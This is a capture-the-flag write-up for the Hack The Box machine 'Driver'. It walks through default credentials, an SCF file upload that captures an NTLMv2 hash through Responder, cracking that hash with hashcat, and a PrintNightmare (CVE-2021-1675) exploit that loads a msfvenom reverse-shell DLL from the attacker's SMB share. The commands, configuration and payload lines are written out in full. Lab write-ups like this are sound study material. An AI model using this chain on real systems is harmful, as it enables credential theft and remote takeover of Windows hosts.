# Port 80
Looking at the page we are prompted with a login page for something called "MFP Firmware Update Center" I was able to guess the credentials `admin:admin`

On the page there was an upload section but none of my reverse shells worked. I learned about a "SCF FileÂ Attacks" https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ 

I set up responder to listen 
`responder -wrf --lm -v -I tun0 `
l
Then I uploaded `@test.scf` file

@test.scf
```
[Shell]
Command=2
IconFile=\\KALIIP\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Responder picked up a username and hash
```
[SMB] NTLMv2 Client   : 10.10.11.106                                                                                  
[SMB] NTLMv2 Username : DRIVER\tony                                                                                   
[SMB] NTLMv2 Hash     : tony::DRIVER:b15c2e7f85d718a9:6E36D9DDD484EACD50000FB0BFDEF4BE:0101000000000000878E404A5DD0D7014A4697B1EBFEE0A900000000020000000000000000000000
```

Now we can crack this hash using hashcat, I used my host machine 
`PS C:\hashcat-6.2.3> ./hashcat.exe -m 5600 ..\hash.txt ..\rockyou.txt`

It cracks it and we get a login of `tony:liltony`

## Priv Esc

We can use our credentials to log in with evil-winrm
```
â”€â”€(rootðŸ’€kali)-[~/htb/driver]                                                                                        
â””â”€# /opt/evil-winrm/evil-winrm.rb -i 10.10.11.106 -u tony -p liltony
```

Since this is a printer website and PrinterNightmare just came out lets try giving it a try I used Cube0x0's script https://github.com/cube0x0/CVE-2021-1675

Step 1 is to install Cube's version of impacket
```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Then lets get the exploit
`git clone https://github.com/cube0x0/CVE-2021-1675.git`

We will need to set up a SMB server on kali I used these configurations
`/etc/samba/smb.conf`

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[share]
    comment = Samba
    path = /srv/smb/
    guest ok = yes
    read only = no
    browsable = yes
    force user = nobody

```

Restart the service. (Make sure to turn off impacket or it will mess things up)
`service smbd restart`

Then we need to create a payload, copy it to /srv/smb/
```
â”Œâ”€â”€(rootðŸ’€kali)-[/etc/samba]
â””â”€# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f dll -o  /srv/smb/rev.dll
```

Now we can run our exploit and get a reverse shell as authority

Set up a listener
`nc -lvnp 4444`

Run the exploit
`./CVE-2021-1675.py 'DRIVER/tony:liltony@10.10.11.106' '\\KALIIP\share\rev.dll' `

And we get root!
```
